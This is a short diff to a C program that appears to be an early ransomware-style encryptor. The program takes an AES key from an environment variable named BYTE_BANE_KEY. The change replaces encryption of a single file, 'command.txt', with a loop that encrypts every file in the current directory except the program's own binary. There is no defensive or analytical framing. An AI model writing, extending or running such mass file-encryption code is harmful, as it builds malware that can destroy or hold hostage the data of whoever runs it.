@@ -5,6 +5,7 @@
 #include <string.h>
 #include <pthread.h>
 #include <unistd.h>
+#include <dirent.h>
 #define MAX_LINE_LEN 512
 
 int encrypt_file(char * file_path, AES_KEY key){
@@ -68,9 +69,21 @@ int encrypt_file(char * file_path, AES_KEY key){
 
 int main() {
     char * key = getenv("BYTE_BANE_KEY");
-    char * file_path = "command.txt";
     AES_KEY aes_key;
     AES_set_encrypt_key(key, 128, &aes_key);
-    encrypt_file(file_path, aes_key);
+
+    DIR * current_dir;
+    struct dirent * dir;
+    
+    current_dir = opendir(".");
+    if (current_dir){
+        while ((dir = readdir(current_dir)) != NULL){
+            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0 || strcmp(dir->d_name, "main") == 0){
+                continue;
+            }
+            encrypt_file(dir->d_name, aes_key);
+        }
+    }
+
     return 0;
 }
